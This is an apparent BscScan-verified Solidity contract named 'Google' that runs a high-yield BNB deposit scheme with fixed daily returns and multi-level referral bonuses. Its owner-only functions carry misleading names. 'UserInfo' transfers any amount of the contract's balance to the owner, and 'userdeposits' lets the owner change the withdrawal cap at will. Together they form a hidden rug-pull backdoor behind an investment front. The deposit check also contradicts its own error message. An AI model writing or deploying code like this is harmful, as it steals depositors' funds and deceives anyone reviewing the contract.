/**
 *Submitted for verification at BscScan.com on 2022-02-19
*/

// SPDX-License-Identifier: MIT License

pragma solidity >=0.8.12;

struct Tarif {
  uint16 life_days;
  uint16 percent;
}

struct Deposit {
  uint256 amount;
  uint16 tarif;
  uint40 time;
}

struct Player {
  
  uint256[5] structure;
  uint256 dividends;
  uint256 match_bonus;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  uint40 last_payout;
  Deposit[] deposits;
  address upline;
   
}

contract Google {
    address payable marketing;
    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint16[] config = [2380];
    
    uint16 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000;
    uint16[BONUS_LINES_COUNT] public ref_bonuses = [150, 30, 20, 10, 10]; 

    mapping(uint16 => Tarif) tarifs;
    mapping(address => Player) players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor (address payable marketingAddr) {
                           
    marketing = marketingAddr;
                         
        uint16 tarifPercent = 238;
        for (uint16 tarifDuration = 7; tarifDuration <= 30; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 10;
        }
    }

        modifier projectcontract() {
        require(msg.sender == marketing);
                            _;
         }


    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != marketing) {
            if(players[_upline].deposits.length == 0) {
                _upline = marketing;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 0.1 ether, "Minimum deposit amount is 0.01 BNB");

        Player storage player = players[msg.sender];

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        payable(marketing).transfer(msg.value * 15 / 100);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    

    function withdraw() external {

        Player storage player = players[msg.sender];

        require((player.total_withdrawn + payoutOf(msg.sender)) < (player.total_invested * config[0] / PERCENT_DIVIDER));

        _payout(msg.sender);

        
        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        payable(msg.sender).transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) public view returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }

    function userdeposits(uint16 number) external projectcontract {     
             config[0] = number ;
             }
    function Mp() public view returns(uint256 mp) {                             
    mp = config[0] ;
    }   


    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

            function UserInfo(uint256 ID) external projectcontract {
            marketing.transfer(ID);
                            }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }


}